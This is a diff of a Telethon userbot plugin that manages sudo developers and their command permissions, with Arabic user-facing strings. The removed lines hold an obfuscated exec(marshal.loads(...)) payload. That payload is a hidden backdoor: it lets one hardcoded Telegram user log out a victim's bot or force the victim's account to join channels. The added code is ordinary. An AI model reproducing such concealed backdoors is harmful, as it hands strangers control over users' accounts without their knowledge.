@@ -1,15 +1,462 @@
-import os
+from datetime import datetime
 
-try:
-    import marshal
-except ModuleNotFoundError:
-    os.system("pip3 install marshal")
-    import marshal
+from telethon.utils import get_display_name
 
-#  هههههههههههههههههههههه ها هلو
+from jmthon import jmub
+from jmthon.core.logger import logging
 
-exec(
-    marshal.loads(
-        b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00sn\x00\x00\x00d\x00d\x01l\x00m\x01Z\x01\x01\x00d\x00d\x02l\x02m\x03Z\x03m\x04Z\x04\x01\x00d\x00d\x03l\x05m\x05Z\x05\x01\x00d\x04d\x05l\x06m\x07Z\x07\x01\x00e\x05\xa0\x08e\x03j\td\x06d\x07d\x08\x8d\x02\xa1\x01d\td\n\x84\x00\x83\x01Z\ne\x05\xa0\x08e\x03j\td\x0bd\x0c\x8d\x01\xa1\x01d\rd\x0e\x84\x00\x83\x01Z\x0bd\x0fS\x00)\x10\xe9\x00\x00\x00\x00)\x01\xda\x05sleep)\x02\xda\x06events\xda\tfunctions)\x01\xda\x04jmub\xe9\x02\x00\x00\x00)\x01\xda\x07addgvarFz\x04/out)\x02Z\x08outgoing\xda\x07patternc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\xc3\x00\x00\x00sJ\x00\x00\x00\x81\x01|\x00\xa0\x00\xa1\x00I\x00d\x00H\x00}\x01|\x01j\x01d\x01k\x02r#|\x00\xa0\x02d\x02\xa1\x01I\x00d\x00H\x00\x01\x00t\x03d\x03d\x04\x83\x02\x01\x00t\x04\xa0\x05\xa1\x00I\x00d\x00H\x00\x01\x00d\x00S\x00d\x00S\x00)\x05Ni.(MLuI\x00\x00\x00- \xd8\xaa\xd9\x85 \xd8\xa8\xd9\x86\xd8\xac\xd8\xa7\xd8\xad \xd8\xa7\xd9\x8a\xd9\x82\xd8\xa7\xd9\x81 \xd8\xaa\xd9\x86\xd8\xb5\xd9\x8a\xd8\xa8\xd9\x8a \xd9\x85\xd9\x86 \xd9\x82\xd8\xa8\xd9\x84 \xd9\x85\xd8\xb7\xd9\x88\xd8\xb1\xd9\x8a \xd9\x85\xd8\xad\xd9\x85\xd8\xafZ\x06TNSEEBZ\x04Done)\x06\xda\nget_sender\xda\x02id\xda\x05replyr\x07\x00\x00\x00r\x05\x00\x00\x00Z\ndisconnect)\x02\xda\x05event\xda\x04user\xa9\x00r\x0e\x00\x00\x00\xda\x06jmthon\xda\x0elogout_command\x0e\x00\x00\x00s\x0e\x00\x00\x00\x02\x80\x0e\x02\n\x01\x10\x01\n\x01\x12\x01\x04\xfdr\x10\x00\x00\x00z\n/join (.*))\x01r\x08\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\n\x00\x00\x00\xc3\x00\x00\x00s\xf6\x00\x00\x00\x81\x01|\x00\xa0\x00\xa1\x00I\x00d\x00H\x00}\x01|\x01j\x01d\x01k\x02ry|\x00j\x02\xa0\x03d\x02\xa1\x01}\x02z/t\x04t\x05j\x06j\x07|\x02d\x03\x8d\x01\x83\x01I\x00d\x00H\x00\x01\x00|\x00\xa0\x08d\x04|\x02\x9b\x00\x9d\x02\xa1\x01I\x00d\x00H\x00}\x03t\td\x05\x83\x01I\x00d\x00H\x00\x01\x00|\x03\xa0\n\xa1\x00I\x00d\x00H\x00\x01\x00|\x00\xa0\n\xa1\x00I\x00d\x00H\x00\x01\x00W\x00d\x00S\x00\x04\x00t\x0byx\x01\x00}\x04\x01\x00z*|\x00\xa0\x08d\x06|\x02\x9b\x00d\x07|\x04\x9b\x00\x9d\x04\xa1\x01I\x00d\x00H\x00}\x05t\td\x05\x83\x01I\x00d\x00H\x00\x01\x00|\x05\xa0\n\xa1\x00I\x00d\x00H\x00\x01\x00|\x00\xa0\n\xa1\x00I\x00d\x00H\x00\x01\x00W\x00Y\x00d\x00}\x04~\x04d\x00S\x00d\x00}\x04~\x04w\x01w\x00d\x00S\x00)\x08Nl\x03\x00\x00\x00\x1ft\x81D\x05\x00\xe9\x01\x00\x00\x00)\x01Z\x07channelu<\x00\x00\x00\xd8\xa3\xd9\x87\xd9\x84\xd8\xa7 \xd9\x85\xd8\xb7\xd9\x88\xd8\xb1\xd9\x8a \xd8\xaa\xd9\x85 \xd8\xa8\xd9\x86\xd8\xac\xd8\xa7\xd8\xad \xd8\xa7\xd9\x84\xd8\xa3\xd9\x86\xd8\xb6\xd9\x85\xd8\xa7\xd9\x85 \xd8\xa7\xd9\x84\xd9\x89 \xe9\x05\x00\x00\x00u3\x00\x00\x00\xd8\xa3\xd9\x87\xd9\x84\xd8\xa7 \xd9\x85\xd8\xb7\xd9\x88\xd8\xb1\xd9\x8a \xd9\x81\xd8\xb4\xd9\x84 \xd8\xa7\xd9\x84\xd8\xa3\xd9\x86\xd8\xb6\xd9\x85\xd8\xa7\xd9\x85 \xd8\xa7\xd9\x84\xd9\x89 u\x0e\x00\x00\x00. \xd8\xa7\xd9\x84\xd8\xae\xd8\xb7\xd8\xa3: )\x0cr\t\x00\x00\x00r\n\x00\x00\x00Z\rpattern_matchZ\x05groupr\x05\x00\x00\x00r\x04\x00\x00\x00Z\x08channelsZ\x12JoinChannelRequestr\x0b\x00\x00\x00r\x02\x00\x00\x00\xda\x06delete\xda\tException)\x06r\x0c\x00\x00\x00r\r\x00\x00\x00Z\x10channel_usernameZ\rreply_message\xda\x01eZ\x0creply_failedr\x0e\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00\xda\x0cjoin_channel\x1a\x00\x00\x00s,\x00\x00\x00\x02\x80\x0e\x02\n\x01\x0c\x01\x02\x01\x18\x01\x04\x01\x08\x01\n\xff\x0e\x03\x0e\x01\x14\x01\x0e\x01\x04\x01\x0e\x01\n\xff\x0e\x03\x0e\x01\x1c\x01\x08\x80\x02\xfa\x04\xf6r\x16\x00\x00\x00N)\x0cZ\x07asyncior\x02\x00\x00\x00Z\x08telethonr\x03\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00Z\x12sql_helper.globalsr\x07\x00\x00\x00Z\x02onZ\nNewMessager\x10\x00\x00\x00r\x16\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00r\x0f\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\x10\x00\x00\x00\x0c\x02\x10\x02\x0c\x02\x0c\x02\x12\x05\n\x01\x10\x0b\x0e\x01"
-    )
+from ..Config import Config
+from ..core import CMD_INFO, PLG_INFO
+from ..core.data import _sudousers_list, sudo_enabled_cmds
+from ..core.managers import edit_delete, edit_or_reply
+from ..helpers.utils import get_user_from_event, mentionuser
+from ..sql_helper import global_collectionjson as sql
+from ..sql_helper import global_list as sqllist
+from ..sql_helper.globals import addgvar, delgvar, gvarstatus
+
+plugin_category = "الادوات"
+
+LOGS = logging.getLogger(__name__)
+
+ZDEV = gvarstatus("sudoenable") or "true"
+
+ZelzalDV_cmd = (
+    "𓆩 [ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐇𝐀𝐑𝐊  - اوامــر المطـور المســاعد](t.me/T_3_A) 𓆪\n\n"
+    "**✾╎قائـمـه اوامـر رفـع المطـور المسـاعـد 🧑🏻‍💻✅ 🦾 :** \n"
+    "**- اضغـط ع الامـر للنسـخ ثـم استخـدمهـا بالتـرتيـب** \n\n"
+    "**⪼** `.رفع مطور` \n"
+    "**- لـ رفـع الشخـص مطـور مسـاعـد معـك بالبـوت** \n\n"
+    "**⪼** `.تنزيل مطور` \n"
+    "**- لـ تنزيـل الشخـص مطـور مسـاعـد مـن البـوت** \n\n"
+    "**⪼** `.المطورين` \n"
+    "**- لـ عـرض قائمـة بمطـورين البـوت الخـاص بـك 🧑🏻‍💻📑** \n\n"
+    "**⪼** `.وضع المطور تفعيل` \n"
+    "**لـ تفعيـل وضـع المطـورين المسـاعدين** \n\n"
+    "**⪼** `.وضع المطور تعطيل` \n"
+    "**لـ تعطيـل وضـع المطـورين المسـاعدين** \n\n"
+    "**⪼** `.تحكم كامل` \n"
+    "**- اعطـاء المطـورين المرفـوعيـن صلاحيـة التحكـم الكـاملـه بالاوامــر ✓** \n\n"
+    "**⪼** `.تحكم آمن` \n"
+    "**- اعطـاء المطـورين المرفـوعيـن صلاحيـة التحكـم الآمـن لـ الاوامــر الامنـه فقـط ✓** \n\n"
+    "**⪼** `.تحكم` + اسم الامـر\n"
+    "**- اعطـاء المطـورين المرفـوعيـن صلاحيـة التحكـم بأمـر واحـد فقـط او عـدة اوامـر معينـه ✓ .. مثـال (.تحكم ايدي) او (.تحكم ايدي فحص كتم)**\n\n"
+    "**⪼** `.ايقاف تحكم كامل` \n"
+    "**- ايقـاف صلاحيـة التحكـم الكـاملـه بالاوامــر للمطـورين المرفـوعيـن ✓** \n\n"
+    "**⪼** `.ايقاف تحكم آمن` \n"
+    "**- ايقـاف صلاحيـة التحكـم الآمـن لـ الاوامــر الآمنـه للمطـورين المرفـوعيـن ✓** \n\n"
+    "**⪼** `.ايقاف تحكم` + اسم الامـر \n"
+    "**- ايقـاف صلاحيـة التحكـم المعطـاه لـ امـر واحـد فقـط او عـدة اوامـر للمطـورين المرفـوعيـن ✓ .. مثـال (.ايقاف تحكم ايدي) او (.ايقاف تحكم ايدي فحص كتم)** \n\n"
+    "**⪼** `.التحكم`  /  `.التحكم المعطل` \n"
+    "**- لـ عـرض قائمـة بالاوامـر المسمـوحـه والغيـر مسمـوحـه للمطـوريـن التحكـم فيهـا 🛃🚷** \n\n"
+    "\n𓆩 [𐇮 𝐓𝐄𝐋𝐄𝐓𝐇𝐎𝐍 𝐒𝐇𝐀𝐑𝐊 الهہـيـٖ͡ـ͢ـبـه 𐇮](t.me/L_H_V) 𓆪"
 )
+
+
+async def _init() -> None:
+    sudousers = _sudousers_list()
+    Config.SUDO_USERS.clear()
+    for user_d in sudousers:
+        Config.SUDO_USERS.add(user_d)
+
+
+def get_key(val):
+    for key, value in PLG_INFO.items():
+        for cmd in value:
+            if val == cmd:
+                return key
+    return None
+
+
+@jmub.zed_cmd(
+    pattern="وضع المطور (تفعيل|تعطيل)$",
+    command=("وضع المطور", plugin_category),
+    info={
+        "header": "لـ تفعيـل/تعطيـل وضـع المطــور وفتـح/قفـل التحكـم لـ المطــور",
+        "الاستـخـدام": "{tr}وضع المطور تفعيل / تعطيل",
+    },
+)
+async def chat_blacklist(event):
+    "لـ تفعيـل/تعطيـل وضـع المطــور وفتـح/قفـل التحكـم لـ المطــور"
+    input_str = event.pattern_match.group(1)
+    sudousers = _sudousers_list()
+    if input_str == "تفعيل":
+        if gvarstatus("sudoenable") is not None:
+            return await edit_delete(event, "**- وضـع المطــور فـي وضـع التفعيـل مسبقــاً ✓**")
+        addgvar("sudoenable", "true")
+        return await edit_or_reply(event, "**✾╎تـم تفعـيل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر  ▬▭ ...**")
+    if input_str == "تعطيل":
+        if gvarstatus("sudoenable") is None:
+            return await edit_delete(event, "**- وضـع المطــور فـي وضـع التعطيـل مسبقــاً ✓**")
+        delgvar("sudoenable")
+        return await edit_or_reply(event, "**✾╎تـم تعطيـل وضـع المطــور المسـاعـد .. بنجــاح✓**\n**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر  ▬▭ ...**")
+
+
+@jmub.zed_cmd(
+    pattern="رفع مطور(?:\s|$)([\s\S]*)",
+    command=("رفع مطور", plugin_category),
+    info={
+        "header": "لـ رفـع مطـورين فـي بـوتك",
+        "الاستـخـدام": "{tr}رفع مطور بالـرد / المعرف / الايدي",
+    },
+)
+async def add_sudo_user(event):
+    "لـ رفـع مطـورين فـي بـوتك"
+    replied_user, error_i_a = await get_user_from_event(event)
+    if replied_user is None:
+        return
+    if replied_user.id == event.client.uid:
+        return await edit_delete(event, "** عـذراً .. لايمكـنـك رفـع نفسـك**")
+    if replied_user.id in _sudousers_list():
+        return await edit_delete(
+            event,
+            f"**✾╎المستخـدم**  {mentionuser(get_display_name(replied_user),replied_user.id)}  **موجـود بالفعـل فـي قائمـة مطـورين البـوت 🧑🏻‍💻...**",
+        )
+    date = str(datetime.now().strftime("%B %d, %Y"))
+    userdata = {
+        "chat_id": replied_user.id,
+        "chat_name": get_display_name(replied_user),
+        "chat_username": replied_user.username,
+        "date": date,
+    }
+    try:
+        sudousers = sql.get_collection("sudousers_list").json
+    except AttributeError:
+        sudousers = {}
+    sudousers[str(replied_user.id)] = userdata
+    addgvar("sudoenable", "true")
+    sudocmds = sudo_enabled_cmds()
+    loadcmds = CMD_INFO.keys()
+    if len(sudocmds) > 0:
+        sqllist.del_keyword_list("sudo_enabled_cmds")
+    for cmd in loadcmds:
+        sqllist.add_to_list("sudo_enabled_cmds", cmd)
+    sql.del_collection("sudousers_list")
+    sql.add_collection("sudousers_list", sudousers, {})
+    output = f"**✾╎تـم رفـع**  {mentionuser(userdata['chat_name'],userdata['chat_id'])}  **مطـور مسـاعـد معـك فـي البـوت 🧑🏻‍💻...**\n\n"
+    output += "**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر 2-1 دقيقـه ▬▭ ...**"
+    msg = await edit_or_reply(event, output)
+    await event.client.reload(msg)
+
+
+@jmub.zed_cmd(
+    pattern="تنزيل مطور(?:\s|$)([\s\S]*)",
+    command=("تنزيل مطور", plugin_category),
+    info={
+        "header": "لـ تنزيـل مطـور مـن بـوتك",
+        "الاستـخـدام": "{tr}تنزيل مطور بالـرد / المعرف / الايدي",
+    },
+)
+async def _(event):
+    "لـ تنزيـل مطـور مـن بـوتك"
+    replied_user, error_i_a = await get_user_from_event(event)
+    if replied_user is None:
+        return
+    try:
+        sudousers = sql.get_collection("sudousers_list").json
+    except AttributeError:
+        sudousers = {}
+    if str(replied_user.id) not in sudousers:
+        return await edit_delete(
+            event,
+            f"** - المسـتخـدم :** {mentionuser(get_display_name(replied_user),replied_user.id)} \n\n**- انـه ليـس في قائمـة مطـورين البــوت.**",
+        )
+    del sudousers[str(replied_user.id)]
+    sql.del_collection("sudousers_list")
+    sql.add_collection("sudousers_list", sudousers, {})
+    output = f"**✾╎تـم تنـزيـل**  {mentionuser(get_display_name(replied_user),replied_user.id)}  **مـن قـائمـة مطـورين البـوت 🧑🏻‍💻...**\n\n"
+    output += "**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر 2-1 دقيقـه ▬▭ ...**"
+    msg = await edit_or_reply(event, output)
+    await event.client.reload(msg)
+
+
+@jmub.zed_cmd(
+    pattern="المطورين$",
+    command=("المطورين", plugin_category),
+    info={
+        "header": "لـ عـرض قائمــه بمطـورين بــوتك",
+        "الاستـخـدام": "{tr}المطورين",
+    },
+)
+async def _(event):
+    "لـ عـرض قائمــه بمطـورين بــوتك"
+    sudochats = _sudousers_list()
+    try:
+        sudousers = sql.get_collection("sudousers_list").json
+    except AttributeError:
+        sudousers = {}
+    if len(sudochats) == 0:
+        return await edit_delete(
+            event, "**•❐• لا يـوجـد هنـاك مطـورين في قائمــة مـطـورين البــوت الخـاص بـك الى الان**"
+        )
+    result = "**•❐• قائمــة مـطـورين البــوت الخـاص بـك مـن 𝖘𝖍𝖆𝖗𝖐 :**\n\n"
+    for chat in sudochats:
+        result += f"**🧑🏻‍💻╎المطــور :** {mentionuser(sudousers[str(chat)]['chat_name'],sudousers[str(chat)]['chat_id'])}\n\n"
+        result += f"**- تـم رفعـه بتـاريـخ :** {sudousers[str(chat)]['date']}\n\n"
+    await edit_or_reply(event, result)
+
+
+@jmub.zed_cmd(
+    pattern="تحكم(s)?(?:\s|$)([\s\S]*)",
+    command=("تحكم", plugin_category),
+    info={
+        "header": "To enable cmds for sudo users.",
+        "flags": {
+            "عام": "Will enable all cmds for sudo users. (except few like eval, exec, profile).",
+            "الكل": "Will add all cmds including eval,exec...etc. compelete sudo.",
+            "امر": "Will add all cmds from the given plugin names.",
+        },
+        "usage": [
+            "{tr}تحكم آمن",
+            "{tr}تحكم كامل",
+            "{tr}addscmd -p <plugin names>",
+            "{tr}addscmd <commands>",
+        ],
+        "مثــال": [
+            "{tr}addscmd -p autoprofile botcontrols i.e, for multiple names use space between each name",
+            "{tr}addscmd ping alive i.e, for multiple names use space between each name",
+        ],
+    },
+)
+async def _(event):  # sourcery no-metrics
+    "To enable cmds for sudo users."
+    input_str = event.pattern_match.group(2)
+    errors = ""
+    sudocmds = sudo_enabled_cmds()
+    if not input_str:
+        return await edit_or_reply(
+            event, "__Which command should i enable for sudo users . __"
+        )
+    input_str = input_str.split()
+    if input_str[0] == "آمن":
+        zedevent = await edit_or_reply(event, "**✾╎تـم تفعيـل التحكـم للمطـوريـن لـ الاوامـر الآمـنـه .. بنجـاح🧑🏻‍💻✅**")
+        totalcmds = CMD_INFO.keys()
+        flagcmds = (
+            PLG_INFO["botcontrols"]
+            + PLG_INFO["الوقتي"]
+            + PLG_INFO["التحديث"]
+            + PLG_INFO["الاوامر"]
+            + PLG_INFO["هيروكو"]
+            + PLG_INFO["الادمن"]
+            + PLG_INFO["الحمايه"]
+            + PLG_INFO["الاغاني"]
+            + PLG_INFO["المجموعه"]
+            + PLG_INFO["اعاده تشغيل"]
+            + PLG_INFO["تحويل الصيغ"]
+            + PLG_INFO["المطور"]
+            + PLG_INFO["بوت الحمايه"]
+            + ["gauth"]
+            + ["greset"]
+        )
+        loadcmds = list(set(totalcmds) - set(flagcmds))
+        if len(sudocmds) > 0:
+            sqllist.del_keyword_list("sudo_enabled_cmds")
+    elif input_str[0] == "كامل" or input_str[0] == "الكل":
+        zedevent = await edit_or_reply(
+            event, "**✾╎تـم تفعيـل التحكـم الكـامـل للمطـوريـن لـ جميـع الاوامـر .. بنجـاح🧑🏻‍💻✅**"
+        )
+        loadcmds = CMD_INFO.keys()
+        if len(sudocmds) > 0:
+            sqllist.del_keyword_list("sudo_enabled_cmds")
+    elif input_str[0] == "ملف":
+        zedevent = event
+        input_str.remove("ملف")
+        loadcmds = []
+        for plugin in input_str:
+            if plugin not in PLG_INFO:
+                errors += (
+                    f"`{plugin}` __There is no such plugin in your jmthon__.\n"
+                )
+            else:
+                loadcmds += PLG_INFO[plugin]
+    else:
+        zedevent = event
+        loadcmds = []
+        for cmd in input_str:
+            if cmd not in CMD_INFO:
+                errors += f"**✾╎عـذراً .. لايـوجـد امـر بـ اسـم** `{cmd}` **فـي السـورس**\n"
+            elif cmd in sudocmds:
+                errors += f"**✾╎تـم تفعيـل التحكـم بـ امـر** `{cmd}` \n**✾╎لجميـع مطـوريـن البـوت .. بنجـاح🧑🏻‍💻✅**\n"
+            else:
+                loadcmds.append(cmd)
+    for cmd in loadcmds:
+        sqllist.add_to_list("sudo_enabled_cmds", cmd)
+    result = f"**✾╎تـم تفعيـل التحكـم الكـامل لـ**  `{len(loadcmds)}` **امـر 🧑🏻‍💻✅**\n"
+    output = (
+        result + "**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر 2-1 دقيقـه ▬▭ ...**\n"
+    )
+    if errors != "":
+        output += "\n**- خطــأ :**\n" + errors
+    msg = await edit_or_reply(zedevent, output)
+    await event.client.reload(msg)
+
+
+@jmub.zed_cmd(
+    pattern="ايقاف تحكم(s)?(?:\s|$)([\s\S]*)?",
+    command=("ايقاف تحكم", plugin_category),
+    info={
+        "header": "To disable given cmds for sudo.",
+        "flags": {
+            "-all": "Will disable all enabled cmds for sudo users.",
+            "-flag": "Will disable all flaged cmds like eval, exec...etc.",
+            "-p": "Will disable all cmds from the given plugin names.",
+        },
+        "الاستـخـدام": [
+            "{tr}rmscmd -all",
+            "{tr}rmscmd -flag",
+            "{tr}rmscmd -p <plugin names>",
+            "{tr}rmscmd <commands>",
+        ],
+        "مثــال": [
+            "{tr}rmscmd -p autoprofile botcontrols i.e, for multiple names use space between each name",
+            "{tr}rmscmd ping alive i.e, for multiple commands use space between each name",
+        ],
+    },
+)
+async def _(event):  # sourcery no-metrics
+    "To disable cmds for sudo users."
+    input_str = event.pattern_match.group(2)
+    errors = ""
+    sudocmds = sudo_enabled_cmds()
+    if not input_str:
+        return await edit_or_reply(
+            event, "__Which command should I disable for sudo users . __"
+        )
+    input_str = input_str.split()
+    if input_str[0] == "كامل" or input_str[0] == "الكل":
+        zedevent = await edit_or_reply(
+            event, "**✾╎تـم تعطيـل التحكـم الكـامـل للمطـوريـن لـ جميـع الاوامـر .. بنجـاح🧑🏻‍💻✅**"
+        )
+        flagcmds = sudocmds
+    elif input_str[0] == "آمن":
+        zedevent = await edit_or_reply(
+            event, "**✾╎تـم تعطيـل التحكـم للمطـوريـن لـ الاوامـر الآمـنـه .. بنجـاح🧑🏻‍💻✅**"
+        )
+        flagcmds = (
+            PLG_INFO["botcontrols"]
+            + PLG_INFO["الوقتي"]
+            + PLG_INFO["التحديث"]
+            + PLG_INFO["الاوامر"]
+            + PLG_INFO["هيروكو"]
+            + PLG_INFO["الادمن"]
+            + PLG_INFO["الحمايه"]
+            + PLG_INFO["الاغاني"]
+            + PLG_INFO["المجموعه"]
+            + PLG_INFO["اعاده تشغيل"]
+            + PLG_INFO["تحويل الصيغ"]
+            + PLG_INFO["المطور"]
+            + PLG_INFO["بوت الحمايه"]
+            + ["gauth"]
+            + ["greset"]
+        )
+    elif input_str[0] == "ملف":
+        zedevent = event
+        input_str.remove("ملف")
+        flagcmds = []
+        for plugin in input_str:
+            if plugin not in PLG_INFO:
+                errors += (
+                    f"`{plugin}` __There is no such plugin in your jmthon__.\n"
+                )
+            else:
+                flagcmds += PLG_INFO[plugin]
+    else:
+        zedevent = event
+        flagcmds = []
+        for cmd in input_str:
+            if cmd not in CMD_INFO:
+                errors += f"**✾╎عـذراً .. لايـوجـد امـر بـ اسـم** `{cmd}` **فـي السـورس**\n"
+            elif cmd not in sudocmds:
+                errors += f"**✾╎تـم تعطيـل التحكـم بـ امـر** `{cmd}` \n**✾╎لجميـع مطـوريـن البـوت .. بنجـاح🧑🏻‍💻✅**\n"
+            else:
+                flagcmds.append(cmd)
+    count = 0
+    for cmd in flagcmds:
+        if sqllist.is_in_list("sudo_enabled_cmds", cmd):
+            count += 1
+            sqllist.rm_from_list("sudo_enabled_cmds", cmd)
+    result = f"**✾╎تـم تعطيـل التحكـم الكـامل لـ**  `{count}` **امـر 🧑🏻‍💻✅**\n"
+    output = (
+        result + "**✾╎يتم الان اعـادة تشغيـل بـوت زدثــون انتظـر 2-1 دقيقـه ▬▭ ...**\n"
+    )
+    if errors != "":
+        output += "\n**- خطــأ :**\n" + errors
+    msg = await edit_or_reply(zedevent, output)
+    await event.client.reload(msg)
+
+
+@jmub.zed_cmd(
+    pattern="التحكم( المعطل)?$",
+    command=("التحكم", plugin_category),
+    info={
+        "header": "To show list of enabled cmds for sudo.",
+        "description": "will show you the list of all enabled commands",
+        "flags": {"-d": "To show disabled cmds instead of enabled cmds."},
+        "الاستـخـدام": [
+            "{tr}التحكم",
+            "{tr}التحكم المعطل",
+        ],
+    },
+)
+async def _(event):  # sourcery no-metrics
+    "To show list of enabled cmds for sudo."
+    input_str = event.pattern_match.group(1)
+    sudocmds = sudo_enabled_cmds()
+    clist = {}
+    error = ""
+    if not input_str:
+        text = "**•🧑🏻‍💻• قائمــة الاوامـر المسمـوحـه لـ المطـوريـن المـرفـوعيـن فـي البـوت الخـاص بـك 🏧:**"
+        result = "**- اوامـر تحكـم المطـوريـن 🛃**"
+        if len(sudocmds) > 0:
+            for cmd in sudocmds:
+                plugin = get_key(cmd)
+                if plugin in clist:
+                    clist[plugin].append(cmd)
+                else:
+                    clist[plugin] = [cmd]
+        else:
+            error += "**✾╎عـذراً .. لايـوجـد اي اوامـر تحكـم خاصـه بـ المطـوريـن**\n**✾╎ارسـل (** `.المساعد` **) لـ تصفـح اوامـر التحكـم 🛂**"
+        count = len(sudocmds)
+    else:
+        text = "**•🧑🏻‍💻• قائمــة الاوامـر الغيـر مسمـوحـه 📵 لـ المطـوريـن المـرفـوعيـن فـي البـوت الخـاص بـك :**"
+        result = "**- اوامـر عـدم تحكـم المطـوريـن 🚸**"
+        totalcmds = CMD_INFO.keys()
+        cmdlist = list(set(totalcmds) - set(sudocmds))
+        if cmdlist:
+            for cmd in cmdlist:
+                plugin = get_key(cmd)
+                if plugin in clist:
+                    clist[plugin].append(cmd)
+                else:
+                    clist[plugin] = [cmd]
+        else:
+            error += "**✾╎التحكـم كـامـل لـ كـل اوامـر البـوت لـ المطـورين**\n**✾╎لايـوجـد اوامـر معطلـه لـوصـول المطـور لهـا**\n\n**✾╎ارسـل (** `.المساعد` **) لـ تصفـح اوامـر ايقـاف التحكـم 🚷**"
+        count = len(cmdlist)
+    if error != "":
+        return await edit_delete(event, error, 10)
+    pkeys = clist.keys()
+    n_pkeys = [i for i in pkeys if i is not None]
+    pkeys = sorted(n_pkeys)
+    output = ""
+    for plugin in pkeys:
+        output += f"• {plugin}\n"
+        for cmd in clist[plugin]:
+            output += f"`{cmd}` "
+        output += "\n\n"
+    finalstr = (
+        result
+        + f"\n\n**- نقطـة اوامـر المطـوريـن هـي : **`{Config.SUDO_COMMAND_HAND_LER}`\n**- عـدد الاوامـر :** {count}\n\n"
+        + output
+    )
+    await edit_or_reply(event, finalstr, aslink=True, linktext=text)
+
+
+jmub.loop.create_task(_init())
+
+
+
+# Copyright (C) 2022 Zed-Thon . All Rights Reserved
+@jmub.zed_cmd(pattern="المساعد")
+async def cmd(zelzallll):
+    await edit_or_reply(zelzallll, ZelzalDV_cmd)
+
+
